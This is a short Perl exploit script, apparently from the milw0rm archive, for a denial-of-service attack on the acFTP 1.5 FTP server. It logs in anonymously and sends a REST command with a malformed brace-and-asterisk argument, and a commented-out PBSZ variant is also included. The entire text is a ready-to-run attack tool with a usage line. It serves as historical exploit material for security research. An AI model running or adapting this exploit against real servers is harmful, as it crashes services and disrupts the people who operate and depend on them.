#################################################
# acFTP 1.5 (REST/PBSZ) Denial of Service       #
# author: gbr                                   #
# mail: gabrielquadros[at]hotmail.com           #
#################################################


use IO::Socket;

if(!defined($ARGV[0])) {
       print "Usage: $0 ip port\n";
       exit;
}

my $sock = new IO::Socket::INET(PeerAddr => $ARGV[0],
                               PeerPort => $ARGV[1],
                               Proto    => 'tcp')
       or die "Could not open a socket: $!\n";

$sock->recv($buf, 1024);
$sock->send("USER anonymous\r\n");
$sock->recv($buf, 1024);
$sock->send("PASS anonymous\r\n");
$sock->recv($buf, 1024);
for($i=0; $i<10; $i++) {
       $data .= "{}*{";
}

$sock->send("REST $data\r\n");
# $sock->send("PBSZ $data\r\n");

print "Server exploited\n";

# milw0rm.com [2006-12-23]
